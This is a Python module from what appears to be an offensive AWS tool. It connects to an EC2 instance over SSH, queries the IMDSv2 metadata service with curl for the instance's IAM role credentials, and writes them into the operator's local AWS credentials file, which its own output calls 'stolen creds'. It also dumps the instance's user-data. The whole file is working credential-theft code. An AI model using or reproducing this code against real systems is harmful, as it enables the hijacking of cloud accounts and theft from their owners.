"""
File: imds.py
Description: contains revelant AWS Instance Metadata functions and actions
"""
from os import access
from os.path import expanduser
from paramiko import SSHClient, AutoAddPolicy, RSAKey
from json import loads

class AwsImds():

  def __init__(self, console) -> None:
    self.console = console

  # [START _create_ssh_session]
  def _create_ssh_session(self, instance_ip: str, key_file: str, user: str) -> None:
    self.ssh = SSHClient()
    k = RSAKey.from_private_key_file(key_file)
    self.ssh.set_missing_host_key_policy(AutoAddPolicy())
    self.console.print("> Connecting to Ec2 instance with SSH key.. ([bold green]CONNECTING[/bold green])")
    try:
      self.ssh.connect(hostname=instance_ip, port=22, username=user, pkey=k)
    except TimeoutError:
      self.console.print("> A TimeoutError occued.. ([red]ERROR[/red])")
      exit(1)
    except:
      self.console.print("> Unable to connect to instance.. ([red]ERROR[/red])")
      exit(1)
  # [END _create_ssh_session]

  # [START get_instance_access_token]
  def get_instance_access_token(
      self, instance_ip: str, key_file: str,
      user: str, new_profile_name: str
      ) -> None:
    self._create_ssh_session(instance_ip, key_file, user)

    # get security credentials using v2 method
    _, stdout, _ = self.ssh.exec_command(
      "TOKEN=`curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`" + \
      " && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/"
    )

    credentials = stdout.readlines()
    i = 1 
    self.console.print("Available Security Credentials:")
    for credential in credentials:
      self.console.print(' '*3, f"{i}. {credential}")
      i += 1
    chosen_creds = credentials[int(self.console.input("Select a credential by number: ").strip())-1]
    self.console.print(f"> Successfully selected credential `{chosen_creds}`.. ([magenta]SUCCESS[/magenta])")

    # get credentials and write to AWS credentials file
    self.console.print("> Grabbing the credentials via IMDS v2.. ([blue]INFO[/blue])")
    _, stdout, _ = self.ssh.exec_command(
      "TOKEN=`curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`" + \
      f" && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/{chosen_creds}"
    )

    creds = loads(''.join(stdout.readlines()))
    access_key_id = creds["AccessKeyId"]
    secret_access_key = creds["SecretAccessKey"]
    session_token = creds["Token"]

    self.console.print(f"> Appending profile `{new_profile_name}` to ~/.aws/credentials file with stolen creds.. ([red]OK[/red])")
    with open(f"{expanduser('~')}/.aws/credentials", "a") as aws_creds_file:
      aws_creds_file.write(f"\n[{new_profile_name}]\n")
      aws_creds_file.write(f"aws_access_key_id = {access_key_id}\n")
      aws_creds_file.write(f"aws_secret_access_key = {secret_access_key}\n")
      aws_creds_file.write(f"aws_session_token = {session_token}")
    self.console.print(f"\nCat ~/.aws/credentials file to confirm creds have been loaded correctly.. ([yellow]CONFIRM[/yellow])")
  # [END get_instance_access_token]

  # [START get_user_data]
  def get_user_data(self, instance_ip: str, key_file: str, user: str) -> None:
    self._create_ssh_session(instance_ip, key_file, user)
    _, stdout, _ = self.ssh.exec_command(
      "TOKEN=`curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`" + \
      f" && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data"
    )
    resp = ''.join(stdout.readlines())
    if "404" in resp:
      self.console.print("> No user-data script found.. ([red]ATTENTION[/red])")
      return
    else:
      self.console.print("> Retrieving user-data.. ([magenta]SUCCESS[/magenta])")
      self.console.print("*"*72)
      self.console.print(resp)
  # [END get_user_data]
